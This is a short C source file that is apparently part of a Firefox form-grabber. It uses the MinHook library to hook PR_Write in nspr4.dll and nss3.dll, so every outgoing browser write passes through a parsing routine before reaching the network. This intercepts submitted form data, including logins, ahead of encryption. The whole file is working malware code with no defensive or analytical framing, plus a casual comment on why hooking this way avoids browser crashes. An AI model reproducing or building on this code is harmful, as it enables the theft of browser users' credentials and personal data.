#include <Windows.h>
#include "formgrab\headers.h"
#include "stdlib.h"
#include "minhook\include\minhook.h"

int(*Real_PR_Write)(void *id, char *buf, int len) = 0;


int My_PR_Write(void *id, char *buf, int len)
{
	HeaderPrase(buf, len, NULL, 0);
	return Real_PR_Write(id, buf, len);
}

void HookFirefox()
{

// to avoid using MH use VirtualAllocEx and make CALL / JMP calls... I hate inline assembly and hooks can be bad and crash browser so i just 
//use min hook lol. 
	MH_Initialize();

	MH_CreateHookApi(L"nspr4.dll", "PR_Write", My_PR_Write, (LPVOID *)&Real_PR_Write);
	MH_CreateHookApi(L"Nss3.dll", "PR_Write", My_PR_Write, (LPVOID *)&Real_PR_Write);
	MH_EnableHook(MH_ALL_HOOKS);
}
